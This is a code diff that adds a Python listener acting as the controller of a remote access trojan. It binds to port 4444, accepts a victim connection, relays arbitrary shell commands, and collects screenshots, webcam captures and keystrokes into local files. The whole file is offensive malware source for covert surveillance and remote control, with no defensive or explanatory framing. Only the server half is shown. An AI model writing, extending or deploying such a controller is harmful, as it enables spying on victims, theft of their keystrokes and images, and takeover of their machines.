@@ -1,0 +1,62 @@
+import socket
+import os
+
+# Function to handle client connection and commands
+def handle_client(client_socket):
+    while True:
+        try:
+            # Wait for the client's command
+            command = input("COMMAND> ")
+
+            if command.lower() == "exit":
+                client_socket.send(command.encode())
+                break
+            elif command == "screenshot":
+                client_socket.send(command.encode())
+                with open("screenshot.png", "wb") as f:
+                    data = client_socket.recv(4096)
+                    while data:
+                        f.write(data)
+                        data = client_socket.recv(4096)
+            elif command == "webcam":
+                client_socket.send(command.encode())
+                with open("webcam.jpg", "wb") as f:
+                    data = client_socket.recv(4096)
+                    while data:
+                        f.write(data)
+                        data = client_socket.recv(4096)
+            elif command == "keylogger":
+                client_socket.send(command.encode())
+                print("[*] Waiting for keystrokes...")
+                with open("keylogs.txt", "w") as f:
+                    while True:
+                        data = client_socket.recv(1024).decode()
+                        if not data:
+                            break
+                        f.write(data)
+                        print(data)  # Print keystrokes on the server terminal
+            else:
+                client_socket.send(command.encode())
+                response = client_socket.recv(4096).decode()
+                print(response)
+
+        except Exception as e:
+            print(f"Error handling command: {e}")
+            break
+
+# Function to start the server and listen for incoming connections
+def start_server(host="0.0.0.0", port=4444):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((host, port))
+    server.listen(5)
+    print(f"[*] Listening on {host}:{port}...")
+
+    client_socket, addr = server.accept()
+    print(f"[+] Connection from {addr}")
+    handle_client(client_socket)
+
+    client_socket.close()
+    server.close()
+
+if __name__ == "__main__":
+    start_server()
